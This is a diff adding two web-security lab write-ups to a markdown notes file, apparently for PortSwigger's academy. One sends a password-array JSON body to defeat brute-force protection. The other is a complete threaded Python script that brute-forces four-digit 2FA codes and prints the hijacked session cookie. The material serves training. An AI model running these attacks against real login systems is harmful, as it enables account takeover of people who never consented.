@@ -908,11 +908,300 @@ carlos : joshua
 
 ----- 
 
+<details>
+  <summary>🟪 Lab: Broken brute-force protection, multiple credentials per request</summary>
+
+1. try to login as **`calos`** : 
+
+```json
+{"username":"carlos","password":"aaa"}
+```
+
+**`Invalid username or password.`**
+
+
+2. try to send multiple credentials per request
+
+```json
+{
+
+  "username":"carlos",
+  "password":[
+       "aaa",
+       "passowrd",
+       ...
+    ]
+}
+```
+
+## **`Full json`**
+
+```json
+{
+  "username": "carlos",
+  "password": [
+    "123456",
+    "password",
+    "12345678",
+    "qwerty",
+    "123456789",
+    "12345",
+    "1234",
+    "111111",
+    "1234567",
+    "dragon",
+    "123123",
+    "baseball",
+    "abc123",
+    "football",
+    "monkey",
+    "letmein",
+    "shadow",
+    "master",
+    "666666",
+    "qwertyuiop",
+    "123321",
+    "mustang",
+    "1234567890",
+    "michael",
+    "654321",
+    "superman",
+    "1qaz2wsx",
+    "7777777",
+    "121212",
+    "000000",
+    "qazwsx",
+    "123qwe",
+    "killer",
+    "trustno1",
+    "jordan",
+    "jennifer",
+    "zxcvbnm",
+    "asdfgh",
+    "hunter",
+    "buster",
+    "soccer",
+    "harley",
+    "batman",
+    "andrew",
+    "tigger",
+    "sunshine",
+    "iloveyou",
+    "2000",
+    "charlie",
+    "robert",
+    "thomas",
+    "hockey",
+    "ranger",
+    "daniel",
+    "starwars",
+    "klaster",
+    "112233",
+    "george",
+    "computer",
+    "michelle",
+    "jessica",
+    "pepper",
+    "1111",
+    "zxcvbn",
+    "555555",
+    "11111111",
+    "131313",
+    "freedom",
+    "777777",
+    "pass",
+    "maggie",
+    "159753",
+    "aaaaaa",
+    "ginger",
+    "princess",
+    "joshua",
+    "cheese",
+    "amanda",
+    "summer",
+    "love",
+    "ashley",
+    "nicole",
+    "chelsea",
+    "biteme",
+    "matthew",
+    "access",
+    "yankees",
+    "987654321",
+    "dallas",
+    "austin",
+    "thunder",
+    "taylor",
+    "matrix",
+    "mobilemail",
+    "mom",
+    "monitor",
+    "monitoring",
+    "montana",
+    "moon",
+    "moscow"
+  ]
+}
+
+```
+
+
+### click on response and choose show response on browzer or 
+
+> take cookie value in response and use cookie editor extension and add cookie and visit **`/my-account?id=carlos`**
+
+```
+session=VWwWkwr7osG8fIq5lqwIrI7s0tB99OB7;
+```
+
+
+<img width="1824" height="835" alt="image" src="https://github.com/user-attachments/assets/d740bb54-1f52-471c-8d2f-6bf90eb92e8c" />
+
+
+  
+</details>
 
 
 
+<details>
+  <summary>🟪 Lab: 2FA bypass using a brute-force attack</summary>
+
+```python
+import requests
+from bs4 import BeautifulSoup
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading
+import time
+
+BASE_URL = "https://0ac9002b0360b47981c811be0055002a.web-security-academy.net/"
+USERNAME = "carlos"
+PASSWORD = "montoya"
+
+lock = threading.Lock()
+found_code = threading.Event()
+
+# ---------------------------
+# Create a fresh session
+# ---------------------------
+def create_session():
+    return requests.Session()
+
+# ---------------------------
+# Get CSRF Token
+# ---------------------------
+def get_csrf(session, url):
+    r = session.get(url)
+    soup = BeautifulSoup(r.text, "html.parser")
+    csrf_input = soup.find("input", {"name": "csrf"})
+    return csrf_input["value"] if csrf_input else None
+
+# ---------------------------
+# Login with username/password
+# ---------------------------
+def login(session):
+    csrf_token = get_csrf(session, f"{BASE_URL}/login")
+    if not csrf_token:
+        print("[!] Failed to get CSRF token for login.")
+        return False
+
+    data = {
+        "csrf": csrf_token,
+        "username": USERNAME,
+        "password": PASSWORD
+    }
+
+    r = session.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
+    if r.status_code == 302 and "/login2" in r.headers.get("Location", ""):
+        return True
+    return False
+
+# ---------------------------
+# Try a single 2FA code
+# ---------------------------
+def try_code(code):
+    if found_code.is_set():
+        return None
+
+    # Create a new session and login
+    session = create_session()
+    if not login(session):
+        print(f"[ERROR] Failed to log in before trying code {code}")
+        return None
+
+    # Prepare 2FA data
+    mfa_code = str(code).zfill(4)
+    csrf_token = get_csrf(session, f"{BASE_URL}/login2")
+
+    if csrf_token:
+        data = {
+            "csrf": csrf_token,
+            "mfa-code": mfa_code
+        }
+    else:
+        data = {"mfa-code": mfa_code}
+
+    # Send the 2FA attempt
+    r = session.post(f"{BASE_URL}/login2", data=data, allow_redirects=False)
+
+    # Debugging
+    if r.status_code == 302:
+        location = r.headers.get("Location", "")
+        if "/my-account" in location:
+            with lock:
+                if not found_code.is_set():
+                    print(f"[+] 2FA code found: {mfa_code}")
+
+                    # Get the session cookie
+                    cookies = session.cookies.get_dict()
+                    if cookies:
+                        print("[+] Session Cookies:")
+                        for name, value in cookies.items():
+                            print(f"{name} = {value}")
+
+                    found_code.set()
+            return mfa_code
+
+        elif "/login" in location:
+            print(f"[!] Code {mfa_code} failed twice, redirected to login.")
+    return None
+
+# ---------------------------
+# Brute-force 2FA
+# ---------------------------
+def brute_force_2fa():
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = {executor.submit(try_code, code): code for code in range(10000)}
+
+        for i, future in enumerate(as_completed(futures)):
+            if i % 50 == 0:
+                print(f"[*] Tried up to: {str(i).zfill(4)}")
+
+            result = future.result()
+            if result:
+                print(f"[SUCCESS] Final 2FA Code: {result}")
+                return result
+
+    print("[-] No valid 2FA code found.")
+    return None
+
+# ---------------------------
+# Main
+# ---------------------------
+if __name__ == "__main__":
+    start_time = time.time()
+    brute_force_2fa()
+    print(f"Finished in {time.time() - start_time:.2f} seconds")
+```
+
+<img width="907" height="582" alt="image" src="https://github.com/user-attachments/assets/ff67ed96-f33d-400b-a134-9662e8434769" />
+
+### use cookie editor extension and put the new cookie and refresh
+
+![Uploading image.png…]()
 
 
+  
+</details>
 
 
 
